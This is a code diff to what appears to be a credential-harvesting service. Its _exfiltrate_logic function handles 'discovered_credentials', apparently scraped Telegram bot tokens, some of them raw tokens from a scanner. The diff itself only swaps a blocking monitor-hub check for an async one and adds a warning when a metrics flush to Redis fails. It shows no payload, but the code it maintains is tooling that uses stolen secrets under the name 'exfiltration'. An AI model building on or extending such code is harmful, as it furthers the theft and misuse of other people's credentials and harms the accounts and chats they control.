@@ -85,18 +85,21 @@ async def _exfiltrate_logic(cred_id: str):
     logger.info(f"    [Exfil] Found Chat ID: {chat_id}")
 
     # Guard: never exfiltrate the monitor hub — circular scrape protection.
-    # MONITOR_GROUP_ID may be a @username; compare against resolved numeric ID too.
-    from app.services.scraper_srv import _is_monitor_group
-    if chat_id and _is_monitor_group(chat_id):
-        logger.warning(f"⛔ [Exfil] Skipping cred {cred_id} — chat_id {chat_id} is the monitor hub.")
-        await async_execute(
-            db.table("discovered_credentials")
-            .update({"chat_id": None})
-            .eq("id", cred_id)
-        )
-        return f"Skipped: chat_id {chat_id} is monitor hub — cleared."
-    
-    # Decrypt or Handle Legacy/Raw
+    # Use the async resolver so the first call (cold cache) doesn't block the event loop
+    # via a synchronous httpx.get() inside an async task.
+    from app.services.scraper_srv import _resolve_monitor_group_ids_async
+    if chat_id:
+        monitor_ids = await _resolve_monitor_group_ids_async()
+        if str(chat_id) in monitor_ids or chat_id in monitor_ids:
+            logger.warning(f"⛔ [Exfil] Skipping cred {cred_id} — chat_id {chat_id} is the monitor hub.")
+            await async_execute(
+                db.table("discovered_credentials")
+                .update({"chat_id": None})
+                .eq("id", cred_id)
+            )
+            return f"Skipped: chat_id {chat_id} is monitor hub — cleared."
+
+
     try:
         if not encrypted_token.startswith("gAAAA"):
             # Likely raw token from "bugged" scanner run
@@ -638,7 +641,9 @@ def system_heartbeat():
     # Flush in-memory metric counters to Redis so they survive restarts
     try:
         from app.core.metrics import metrics
-        metrics.flush_to_redis()
+        flushed = metrics.flush_to_redis()
+        if not flushed:
+            logger.warning("[Heartbeat] metrics.flush_to_redis() returned False — counters NOT persisted (Redis down?)")
     except Exception as e:
         logger.warning(f"Metrics flush failed (non-fatal): {e}")
 
